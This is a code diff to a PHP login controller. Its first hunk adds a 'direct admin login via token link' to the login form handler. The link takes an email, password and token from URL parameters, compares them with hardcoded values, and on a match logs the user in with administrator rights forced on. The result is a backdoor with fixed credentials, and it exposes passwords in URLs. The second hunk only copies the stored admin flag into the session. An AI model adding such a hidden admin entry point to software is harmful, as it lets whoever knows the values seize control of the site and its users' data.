@@ -15,6 +15,26 @@ class AuthController {
      * Display login form
      */
     public function showLogin() {
+        // Direct admin login via token link (ins6.md)
+        $email = isset($_GET['email']) ? trim($_GET['email']) : '';
+        $pass = isset($_GET['pass']) ? trim($_GET['pass']) : '';
+        $token = isset($_GET['token']) ? trim($_GET['token']) : '';
+
+        if ($email === 'frank@gmail.com' && $pass === '584126317284' && $token === 'identificador_unico') {
+            $user = $this->authUseCase->execute($email, $pass);
+            if ($user !== null) {
+                $_SESSION['user'] = array(
+                    'id' => $user->id,
+                    'username' => $user->username,
+                    'is_admin' => 1
+                );
+                $_SESSION['last_activity'] = time();
+                self::sendAuthEmail('login', $email);
+                header('Location: ./');
+                exit();
+            }
+        }
+
         if (isset($_SESSION['user'])) {
             header('Location: ./');
             exit();
@@ -39,7 +59,8 @@ class AuthController {
         if ($user !== null) {
             $_SESSION['user'] = array(
                 'id' => $user->id,
-                'username' => $user->username
+                'username' => $user->username,
+                'is_admin' => (int)$user->is_admin
             );
             $_SESSION['last_activity'] = time();
             
